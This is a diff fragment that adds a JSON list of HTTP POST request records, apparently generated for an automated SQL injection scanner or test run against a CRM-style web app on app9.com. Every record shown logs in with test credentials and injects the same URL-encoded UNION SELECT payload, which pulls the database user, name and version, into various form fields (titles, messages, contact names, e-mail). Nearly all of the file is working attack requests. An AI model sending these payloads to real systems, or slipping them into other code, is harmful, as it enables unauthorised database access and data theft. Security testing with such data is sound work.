+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts?Contacts_sort=lastActivity", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/services?Services_sort=impact.desc", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/services?Services_sort=impact.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/opportunities?Opportunity_sort=assignedTo.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/marketing?Campaign_sort=lastUpdated.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts?Contacts_sort=leadSource", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts?Contacts_sort=name", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/accounts/", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/accounts?Accounts_sort=name.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/viewGroup", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/viewAll", 
+    "param": {
+      "Actions[completedBy]": [
+        "a"
+      ], 
+      "Actions[priority]": [
+        "a"
+      ], 
+      "Actions[type]": [
+        "a"
+      ], 
+      "Actions[associationName]": [
+        "a"
+      ], 
+      "Actions[actionDescription]": [
+        "a"
+      ], 
+      "Actions[assignedTo]": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/site/createRecords?ret=accounts", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/viewAll?Actions_sort=assignedTo", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/viewAll?Actions_sort=assignedTo", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/2", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/marketing?Campaign_sort=active.desc", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/marketing?Campaign_sort=active.desc", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/marketing?Campaign_sort=subject.desc", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/marketing?Campaign_sort=listId.desc", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/viewAll?Actions_sort=createDate.desc", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/viewGroup?Actions_sort=createDate.desc", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/viewGroup?Actions_sort=associationName", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/lists", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/opportunities?Opportunity_sort=createDate", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/opportunities?Opportunity_sort=expectedCloseDate", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/opportunities?Opportunity_sort=quoteAmount", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/viewGroup?Actions_sort=associationName.desc", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/myContacts", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "Contacts[firstName]": [
+        "First Name"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/opportunities?Opportunity_sort=probability.desc", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/opportunities?Opportunity_sort=quoteAmount.desc", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/newContacts?Contacts_sort=lastActivity", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/myContacts?Contacts_sort=lastActivity", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/myContacts?Contacts_sort=email", 
+    "param": {
+      "Contacts[phone]": [
+        "a"
+      ], 
+      "Contacts[leadSource]": [
+        "a"
+      ], 
+      "Contacts[lastActivity]": [
+        "a"
+      ], 
+      "Contacts[name]": [
+        "a"
+      ], 
+      "Contacts[leadstatus]": [
+        "a"
+      ], 
+      "Contacts[email]": [
+        "a"
+      ], 
+      "C_gvCheckbox_all": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
